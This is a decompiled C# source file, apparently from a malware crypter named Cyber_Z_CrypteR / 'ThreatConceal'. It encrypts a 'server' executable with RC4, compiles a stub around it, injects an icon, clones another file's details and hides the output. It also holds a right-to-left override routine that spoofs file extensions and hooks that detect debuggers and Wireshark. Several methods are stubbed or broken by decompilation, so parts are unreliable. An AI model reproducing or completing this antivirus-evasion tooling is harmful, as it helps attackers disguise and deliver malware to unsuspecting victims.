                iCompilerExe.GenExecutable(true, dialog2.FileName, s3, null, s7 + ".resources", null);
                File.Delete(Application.StartupPath + "\\" + s7 + ".resources");
                flag7 = MyProject.Forms.U_S_G.CheckBox15.Checked;
                if (flag7)
                {
                    MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022Changing Icon\u2022");
                    MyProject.Forms.Work_Progress.Current_Operation.Text = "Changing Icon";
                    Cyber_Z_CrypteR.IconInjector.InjectIcon(dialog2.FileName, MyProject.Forms.U_S_G.TextBox2.Text);
                }
                flag7 = MyProject.Forms.U_S_G.CheckBox3.Checked;
                if (flag7)
                {
                    MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022Cloning file\u2022{" + MyProject.Forms.U_S_G.TextBox9.Text + "}");
                    MyProject.Forms.Work_Progress.Current_Operation.Text = "Cloning file{" + MyProject.Forms.U_S_G.TextBox9.Text + "}";
                    CloneIt(U_S_G.openclone.FileName);
                }
                flag7 = CheckBox9.Checked;
                if (flag7)
                {
                    MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022Null Assembly\u2022");
                    MyProject.Forms.Work_Progress.Current_Operation.Text = "Null Assembly";
                }
                flag7 = MyProject.Forms.U_S_G.CheckBox1.Checked;
                if (flag7)
                {
                    MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022Changing Assembly\u2022");
                    MyProject.Forms.Work_Progress.Current_Operation.Text = "Changing Assembly";
                }
                Check_Antis();
                MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022Final Protection!\u2022" + Conversions.ToString(DateAndTime.Hour(DateAndTime.Now)) + ":" + Conversions.ToString(DateAndTime.Minute(DateAndTime.Now)) + ":" + Conversions.ToString(DateAndTime.Second(DateAndTime.Now)));
                MyProject.Forms.Work_Progress.Current_Operation.Text = "Final Protection!" + Conversions.ToString(DateAndTime.Hour(DateAndTime.Now)) + ":" + Conversions.ToString(DateAndTime.Minute(DateAndTime.Now)) + ":" + Conversions.ToString(DateAndTime.Second(DateAndTime.Now));
                Check_Antis();
                File.SetAttributes(dialog2.FileName, FileAttributes.Hidden);
                flag7 = CheckBox7.Checked;
                if (flag7)
                {
                    Realign realign = new Realign();
                    realign.RealignPE(dialog2.FileName);
                }
                Obfuscator.Eazfuscator(dialog2.FileName);
                Obfuscator.Dexcator(dialog2.FileName);
                MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "");
                MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "File Encrypted with Success!!");
                MyProject.Forms.Work_Progress.Current_Operation.Text = "Operation Completed!";
                flag7 = File.Exists(dialog2.FileName);
                if (flag7)
                    MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "MD5 Hash is:" + MD5CalcFile(dialog2.FileName));
            }
        label_1:;
        }

        private void Cyber_shown(object sender, EventArgs e)
        {
            Fade(false);
        }

        public void Fade(object state)
        {
            bool flag;

            float[] fArr = (float[])state;
            float f3 = fArr[2];
            float f2 = fArr[1];
            float f1 = fArr[0];
            while (flag)
            {
                O.Post(new SendOrPostCallback(SetOpacity), f1);
                Thread.Sleep(15);
                f1 += f3;
                flag = ObjectFlowControl.ForLoopControl.ForNextCheckR4(f1, f2, f3);
            }
        }

        public void Fade(bool out)
        {
            // trial
        }

        public string GetBetween(ref string strSource, ref string strStart, ref string strEnd, ref int startPos)
        {
            // trial
            return null;
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            Color color;
            Point point1;
            Size size1;
            SizeF sizeF1;

            ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Cyber_Z_CrypteR));
            OpenFileDialog1 = new OpenFileDialog();
            SaveFileDialog1 = new SaveFileDialog();
            RTheme1 = new RTheme();
            USGButton = new RButton();
            CryptButton = new RButton();
            RButtonRed2 = new RButtonRed();
            CypherxGroupBox1 = new CypherxGroupBox();
            SecureProcc = new CheckBox();
            CheckBox9 = new CheckBox();
            CheckBox7 = new CheckBox();
            Compressor = new CheckBox();
            CypherxGroupBox3 = new CypherxGroupBox();
            RButton3 = new RButton();
            TextBox1 = new TextBox();
            Label11k = new Label();
            Label15d = new Label();
            Label14l = new Label();
            RTheme1.SuspendLayout();
            CypherxGroupBox1.SuspendLayout();
            CypherxGroupBox3.SuspendLayout();
            SuspendLayout();
            OpenFileDialog1.DefaultExt = "exe";
            OpenFileDialog1.FileName = "Your Server";
            RTheme1.BackColor = Color.FromArgb(28, 28, 28);
            RTheme1.Controls.Add(USGButton);
            RTheme1.Controls.Add(CryptButton);
            RTheme1.Controls.Add(RButtonRed2);
            RTheme1.Controls.Add(CypherxGroupBox1);
            RTheme1.Controls.Add(CypherxGroupBox3);
            RTheme1.Controls.Add(Label11k);
            RTheme1.Controls.Add(Label15d);
            RTheme1.Controls.Add(Label14l);
            RTheme1.Dock = DockStyle.Fill;
            RTheme1.ForeColor = Color.White;
            RTheme1.Image = null;
            Point point2 = new Point(0, 0);
            RTheme1.Location = point2;
            RTheme1.MoveHeight = 26;
            RTheme1.Name = "RTheme1";
            RTheme1.Resizable = false;
            Size size2 = new Size(239, 250);
            RTheme1.Size = size2;
            RTheme1.TabIndex = 0;
            RTheme1.Text = "                          ThreatConceal";
            RTheme1.TransparencyKey = Color.Fuchsia;
            USGButton.Enabled = false;
            USGButton.Image = null;
            point2 = new Point(12, 198);
            USGButton.Location = point2;
            USGButton.Name = "USGButton";
            USGButton.NoRounding = false;
            size2 = new Size(215, 40);
            USGButton.Size = size2;
            USGButton.TabIndex = 260;
            USGButton.Text = "U.S.G";
            CryptButton.Enabled = false;
            CryptButton.Image = null;
            point2 = new Point(12, 162);
            CryptButton.Location = point2;
            CryptButton.Name = "CryptButton";
            CryptButton.NoRounding = false;
            size2 = new Size(215, 30);
            CryptButton.Size = size2;
            CryptButton.TabIndex = 0;
            CryptButton.Text = "Conceal !";
            RButtonRed2.Image = null;
            point2 = new Point(211, 3);
            RButtonRed2.Location = point2;
            RButtonRed2.Name = "RButtonRed2";
            RButtonRed2.NoRounding = false;
            size2 = new Size(23, 21);
            RButtonRed2.Size = size2;
            RButtonRed2.TabIndex = 255;
            CypherxGroupBox1.BackColor = Color.FromArgb(28, 28, 28);
            CypherxGroupBox1.Controls.Add(SecureProcc);
            CypherxGroupBox1.Controls.Add(CheckBox9);
            CypherxGroupBox1.Controls.Add(CheckBox7);
            CypherxGroupBox1.Controls.Add(Compressor);
            CypherxGroupBox1.Header = "Options";
            point2 = new Point(12, 87);
            CypherxGroupBox1.Location = point2;
            CypherxGroupBox1.Name = "CypherxGroupBox1";
            size2 = new Size(215, 69);
            CypherxGroupBox1.Size = size2;
            CypherxGroupBox1.TabIndex = 251;
            SecureProcc.AutoSize = true;
            SecureProcc.BackgroundImage = (Image)componentResourceManager.GetObject("SecureProcc.BackgroundImage");
            SecureProcc.Enabled = false;
            SecureProcc.Font = new Font("Calibri", 8.25F, FontStyle.Regular, GraphicsUnit.Point, 0);
            SecureProcc.ForeColor = Color.FromArgb(80, 80, 80);
            SecureProcc.ImeMode = ImeMode.NoControl;
            point2 = new Point(5, 44);
            SecureProcc.Location = point2;
            SecureProcc.Name = "SecureProcc";
            size2 = new Size(100, 17);
            SecureProcc.Size = size2;
            SecureProcc.TabIndex = 239;
            SecureProcc.Text = "Protect Process";
            SecureProcc.UseVisualStyleBackColor = true;
            CheckBox9.AutoSize = true;
            CheckBox9.BackgroundImage = (Image)componentResourceManager.GetObject("CheckBox9.BackgroundImage");
            CheckBox9.Font = new Font("Calibri", 8.25F, FontStyle.Regular, GraphicsUnit.Point, 0);
            CheckBox9.ForeColor = Color.FromArgb(80, 80, 80);
            CheckBox9.ImeMode = ImeMode.NoControl;
            point2 = new Point(121, 21);
            CheckBox9.Location = point2;
            CheckBox9.Name = "CheckBox9";
            size2 = new Size(92, 17);
            CheckBox9.Size = size2;
            CheckBox9.TabIndex = 205;
            CheckBox9.Text = "Null Assembly";
            CheckBox9.UseVisualStyleBackColor = true;
            CheckBox7.AutoSize = true;
            CheckBox7.BackgroundImage = (Image)componentResourceManager.GetObject("CheckBox7.BackgroundImage");
            CheckBox7.Font = new Font("Calibri", 8.25F, FontStyle.Regular, GraphicsUnit.Point, 0);
            CheckBox7.ForeColor = Color.FromArgb(80, 80, 80);
            CheckBox7.ImeMode = ImeMode.NoControl;
            point2 = new Point(5, 21);
            CheckBox7.Location = point2;
            CheckBox7.Name = "CheckBox7";
            size2 = new Size(111, 17);
            CheckBox7.Size = size2;
            CheckBox7.TabIndex = 202;
            CheckBox7.Text = "Realign PE Header";
            CheckBox7.UseVisualStyleBackColor = true;
            Compressor.BackgroundImage = (Image)componentResourceManager.GetObject("Compressor.BackgroundImage");
            Compressor.Enabled = false;
            Compressor.Font = new Font("Calibri", 8.25F, FontStyle.Regular, GraphicsUnit.Point, 0);
            Compressor.ForeColor = Color.FromArgb(80, 80, 80);
            Compressor.ImeMode = ImeMode.NoControl;
            point2 = new Point(121, 44);
            Compressor.Location = point2;
            Compressor.Name = "Compressor";
            size2 = new Size(85, 17);
            Compressor.Size = size2;
            Compressor.TabIndex = 176;
            Compressor.Text = "Compressor";
            Compressor.UseVisualStyleBackColor = true;
            CypherxGroupBox3.BackColor = Color.FromArgb(28, 28, 28);
            CypherxGroupBox3.Controls.Add(RButton3);
            CypherxGroupBox3.Controls.Add(TextBox1);
            CypherxGroupBox3.Header = "Browse";
            point2 = new Point(12, 34);
            CypherxGroupBox3.Location = point2;
            CypherxGroupBox3.Name = "CypherxGroupBox3";
            size2 = new Size(215, 47);
            CypherxGroupBox3.Size = size2;
            CypherxGroupBox3.TabIndex = 250;
            RButton3.Image = null;
            point2 = new Point(140, 19);
            RButton3.Location = point2;
            RButton3.Name = "RButton3";
            RButton3.NoRounding = false;
            size2 = new Size(68, 20);
            RButton3.Size = size2;
            RButton3.TabIndex = 260;
            RButton3.Text = "*.exe";
            TextBox1.BackColor = SystemColors.MenuText;
            TextBox1.BorderStyle = BorderStyle.FixedSingle;
            TextBox1.Font = new Font("Calibri", 8.25F, FontStyle.Bold);
            TextBox1.ForeColor = Color.Tomato;
            point2 = new Point(5, 20);
            TextBox1.Location = point2;
            TextBox1.Multiline = true;
            TextBox1.Name = "TextBox1";
            TextBox1.ReadOnly = true;
            size2 = new Size(129, 18);
            TextBox1.Size = size2;
            TextBox1.TabIndex = 33;
            TextBox1.Text = "Select File to Encrypt";
            Label11k.AutoSize = true;
            Label11k.Font = new Font("Calibri", 8.25F, FontStyle.Bold, GraphicsUnit.Point, 0);
            Label11k.ForeColor = Color.Tomato;
            Label11k.Image = (Image)componentResourceManager.GetObject("Label11k.Image");
            point2 = new Point(621, 383);
            Label11k.Location = point2;
            Label11k.Name = "Label11k";
            size2 = new Size(0, 13);
            Label11k.Size = size2;
            Label11k.TabIndex = 241;
            Label11k.Visible = false;
            Label15d.AutoSize = true;
            Label15d.Font = new Font("Calibri", 8.25F, FontStyle.Bold, GraphicsUnit.Point, 0);
            Label15d.ForeColor = Color.Tomato;
            Label15d.Image = (Image)componentResourceManager.GetObject("Label15d.Image");
            point2 = new Point(636, 405);
            Label15d.Location = point2;
            Label15d.Name = "Label15d";
            size2 = new Size(0, 13);
            Label15d.Size = size2;
            Label15d.TabIndex = 243;
            Label15d.Visible = false;
            Label14l.AutoSize = true;
            Label14l.Font = new Font("Calibri", 8.25F, FontStyle.Bold, GraphicsUnit.Point, 0);
            Label14l.ForeColor = Color.Tomato;
            Label14l.Image = (Image)componentResourceManager.GetObject("Label14l.Image");
            point2 = new Point(636, 402);
            Label14l.Location = point2;
            Label14l.Name = "Label14l";
            size2 = new Size(0, 13);
            Label14l.Size = size2;
            Label14l.TabIndex = 242;
            Label14l.Visible = false;
            SizeF sizeF2 = new SizeF(6.0F, 13.0F);
            AutoScaleDimensions = sizeF2;
            AutoScaleMode = AutoScaleMode.Font;
            size2 = new Size(239, 250);
            ClientSize = size2;
            Controls.Add(RTheme1);
            FormBorderStyle = FormBorderStyle.None;
            Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
            Name = "Cyber_Z_CrypteR";
            StartPosition = FormStartPosition.CenterScreen;
            Text = "Cyber_Z_CrypteR";
            TopMost = true;
            TransparencyKey = Color.Fuchsia;
            RTheme1.ResumeLayout(false);
            RTheme1.PerformLayout();
            CypherxGroupBox1.ResumeLayout(false);
            CypherxGroupBox1.PerformLayout();
            CypherxGroupBox3.ResumeLayout(false);
            CypherxGroupBox3.PerformLayout();
            ResumeLayout(false);
        }

        private void Loading(object sender, EventArgs e)
        {
            // trial
        }

        public string MD5CalcFile(string strPath)
        {
            // trial
            return null;
        }

        public void Microworld()
        {
            // trial
        }

        public void ollydbg()
        {
            // decompiler error
        }

        private byte[] Proper_RC4(byte[] Input, byte[] Key)
        {
            int i3;
            uint ui2, ui3, ui4;

            uint[] uiArr = new uint[256];
            byte[] bArr1 = new byte[checked(checked(checked((int)Input.Length) - 1) + 1)];
            uint ui1 = 0;
            do
            {
                uiArr[checked((int)ui1)] = ui1;
                ui1 = checked(ui1 + 1);
                ui4 = 255;
            } while (ui1 <= ui4);
            ui1 = 0;
            do
            {
                ui2 = checked((uint)((ulong)checked(checked(ui2 + Key[checked((int)((ulong)ui1 % (long)checked((int)Key.Length)))]) + uiArr[checked((int)ui1)]) & (long)255));
                ui3 = uiArr[checked((int)ui1)];
                uiArr[checked((int)ui1)] = uiArr[checked((int)ui2)];
                uiArr[checked((int)ui2)] = ui3;
                ui1 = checked(ui1 + 1);
                ui4 = 255;
            } while (ui1 <= ui4);
            ui1 = ui2 = 0;
            int i2 = checked(checked((int)bArr1.Length) - 1);
            int i1 = 0;
            while (i1 <= i3)
            {
                ui1 = checked((uint)(checked((ulong)ui1 + (long)1) & (long)255));
                ui2 = checked((uint)((ulong)checked(ui2 + uiArr[checked((int)ui1)]) & (long)255));
                ui3 = uiArr[checked((int)ui1)];
                uiArr[checked((int)ui1)] = uiArr[checked((int)ui2)];
                uiArr[checked((int)ui2)] = ui3;
                bArr1[i1] = checked((byte)(Input[i1] ^ uiArr[checked((int)((ulong)checked(uiArr[checked((int)ui1)] + uiArr[checked((int)ui2)]) & (long)255))]));
                i1 = checked(i1 + 1);
                i3 = i2;
            }
            return bArr1;
        }

        public string RandomStringGen(int numberOfChars)
        {
            int i3;

            Random random = new Random();
            string s2 = null;
            int i2 = checked(numberOfChars - 1);
            int i1 = 0;
            while (i1 <= i3)
            {
                s2 += Conversions.ToString(Strings.Chr(random.Next(33, 255)));
                i1 = checked(i1 + 1);
                i3 = i2;
            }
            return s2;
        }

        private void RButton3_Click(object sender, EventArgs e)
        {
            // trial
        }

        private void RButtonRed2_Click(object sender, EventArgs e)
        {
            int i2;

            Check_Antis();
            int i1 = 90;
            do
            {
                Opacity = (double)i1 / 100.0;
                Thread.Sleep(20);
                i1 = checked(i1 + -10);
                i2 = 10;
            } while (i1 >= i2);
            Opacity = 0.0;
            Close();
            MyProject.Forms.U_S_G.Hide();
            MyProject.Forms.Main.Opacity = 100.0;
            MyProject.Forms.Main.Show();
        }

        public void SetOpacity(object current)
        {
            // trial
        }

        public string string2char(string source)
        {
            // trial
            return null;
        }

        public void U_202E(string file, string extension)
        {
            int i = checked(file.Length - 4);
            char ch = '\x202E';
            char[] chArr = extension.ToCharArray();
            Array.Reverse(chArr);
            string s = file.Substring(0, i) + Conversions.ToString(ch) + (new String(chArr)) + file.Substring(i);
            File.Move(file, s);
        }

        public string UnicodeGen(int HowMany, bool Unicode)
        {
            char[] chArr;
            int i4;

            string s1 = "\u200B";
            bool flag = Unicode;
            if (flag)
                chArr = "\u00C0\u00C1\u00C2\u00C3\u00C4\u00C5\u00C6\u00C7\u00C8\u00C9\u00CA\u00CB\u00CC\u00CD\u00CE\u00CF\u00D0\u00D1\u00D2\u00D3\u00D4\u00D5\u00D6\u00D8\u00D9\u00DA\u00DB\u00DC\u00DD\u00DF\u00E0\u00E1\u00E2\u00E4\u00E5\u00E3\u00E6\u00E7\u00E8\u00E9\u00EA\u00EB\u00EC\u00ED\u00EE\u00EF\u00F0\u00F1\u00F2\u00F3\u00F4\u00F5\u00F6\u00F8\u00F9\u00FA\u00FB\u00FC\u00FD\u00FE\u00FF\u00E1\u0107d\u00E9\u00ED\u0144\u0151\u0155\u015B\u00FAv\u00FD\u017A\u03B1\u0432\u0454\u0192g\u043D\u03B9\u05E0\u043A\u2113\u043C\u03B7\u03C3\u03C1q\u044F\u0455\u0442\u03C5\u03BD\u03C9\u03C7\u0443".ToCharArray();
            else
                chArr = Conversions.ToCharArrayRankOne("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
            string s2 = null;
            VBMath.Randomize();
            StringBuilder stringBuilder = new StringBuilder("");
            int i3 = HowMany;
            int i1 = 1;
            while (i1 <= i4)
            {
                VBMath.Randomize();
                int i2 = checked((int)Math.Round((double)(Conversion.Int((float)checked(checked(checked(checked((int)chArr.Length) - 2) - 0) + 1) * VBMath.Rnd()) + 1.0F)));
                stringBuilder.Append(chArr[i2]);
                i1 = checked(i1 + 1);
                i4 = i3;
            }
            return stringBuilder.ToString();
        }

        private void USGButton_Click(object sender, EventArgs e)
        {
            // trial
        }

        public void wireshark()
        {
            // trial
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            // trial
        }

        [DebuggerNonUserCode]
        private static void __ENCAddToList(object value)
        {
            int i4;

            List<WeakReference> list = Cyber_Z_CrypteR.__ENCList;
            lock (list)
            {
                bool flag1 = Cyber_Z_CrypteR.__ENCList.get_Count() == Cyber_Z_CrypteR.__ENCList.get_Capacity();
                if (flag1)
                {
                    int i1 = 0;
                    int i3 = checked(Cyber_Z_CrypteR.__ENCList.get_Count() - 1);
                    int i2 = 0;
                    while (i2 <= i4)
                    {
                        WeakReference weakReference = Cyber_Z_CrypteR.__ENCList.get_Item(i2);
                        flag1 = weakReference.IsAlive;
                        if (flag1)
                        {
                            bool flag2 = i2 != i1;
                            if (flag2)
                                Cyber_Z_CrypteR.__ENCList.set_Item(i1, Cyber_Z_CrypteR.__ENCList.get_Item(i2));
                            i1 = checked(i1 + 1);
                        }
                        i2 = checked(i2 + 1);
                        i4 = i3;
                    }
                    Cyber_Z_CrypteR.__ENCList.RemoveRange(i1, checked(Cyber_Z_CrypteR.__ENCList.get_Count() - i1));
                    Cyber_Z_CrypteR.__ENCList.set_Capacity(Cyber_Z_CrypteR.__ENCList.get_Count());
                }
                Cyber_Z_CrypteR.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
            }
        }

        public static string random_key(int lenght)
        {
            // trial
            return null;
        }

        [PreserveSig]
        [DllImport("kernel32", EntryPoint = "RtlMoveMemory", CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern void CopyMemory(long Destination, long Source, int Length);

    } // class Cyber_Z_CrypteR

}

